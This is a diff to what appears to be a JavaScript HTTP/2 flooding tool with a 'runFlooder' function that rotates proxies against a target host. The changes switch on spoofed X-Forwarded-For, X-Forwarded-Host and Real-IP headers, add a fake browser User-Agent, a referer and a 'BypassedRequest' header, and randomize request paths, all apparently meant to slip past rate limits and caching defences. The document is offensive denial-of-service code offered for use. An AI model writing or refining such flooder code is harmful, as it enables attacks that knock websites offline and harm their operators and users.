@@ -2928,6 +2928,8 @@ const rateHeaders2 = [
 { "Via": "1.1 " + parsedTarget.host },
 { "X-Requested-With": "XMLHttpRequest" },
 { "X-Forwarded-For": spoofed },
+{ "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" },
+{  "X-Custom-Header": "BypassedRequest" },
 { "X-Vercel-Cache": randstr(15) },
 { "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
 { "TK": "?" },
@@ -2999,36 +3001,38 @@ const rateHeaders2 = [
 var hd={}
  const Socker = new NetSocket();
  headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- //headers["origin"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
- headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
-// headers["X-Forwarded-For"] = spoofed;
-// headers["X-Forwarded-Host"] = spoofed;
- //headers["Real-IP"] = spoofed;
- headers["cache-control"] = control;
- headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = pi;
- //headers["referer"] = parsedTarget.host;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = uap1;
- headers["sec-fetch-dest"] = "document";
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-site"] = "same-origin";
- headers["TE"] = "trailers";
- //headers["Trailer"] = "Max-Forwards";
- headers["sec-fetch-user"] = "?1";
- headers["x-requested-with"] = "XMLHttpRequest";
+//headers["origin"] = `https://${parsedTarget.host}`;
+headers[":path"] = `${parsedTarget.path}?${randstr(5)}=${randstr(25)}`;
+headers[":scheme"] = "https";
+headers["x-forwarded-proto"] = "https";
+headers["accept-language"] = lang;
+headers["accept-encoding"] = encoding;
+headers["X-Forwarded-For"] = spoofed;
+headers["X-Forwarded-Host"] = spoofed;
+headers["X-Custom-Header"] = "BypassedRequest";
+headers["Real-IP"] = spoofed;
+headers["cache-control"] = control;
+headers["sec-ch-ua"] = '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
+headers["sec-ch-ua-mobile"] = "?0";
+headers["sec-ch-ua-platform"] = pi;
+headers["referer"] = `https://${parsedTarget.host}/`;
+headers["upgrade-insecure-requests"] = "1";
+headers["accept"] = accept;
+headers["user-agent"] = uap1;
+headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
+headers["sec-fetch-dest"] = "document";
+headers["sec-fetch-mode"] = "navigate";
+headers["sec-fetch-site"] = "same-origin";
+headers["TE"] = "trailers";
+headers["Trailer"] = "Max-Forwards";
+headers["sec-fetch-user"] = "?1";
+headers["x-requested-with"] = "XMLHttpRequest";
  
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
      const parsedProxy = proxyAddr.split(":");
+     headers[":authority"] = parsedTarget.host;
 
      const proxyOptions = {
          host: parsedProxy[0],
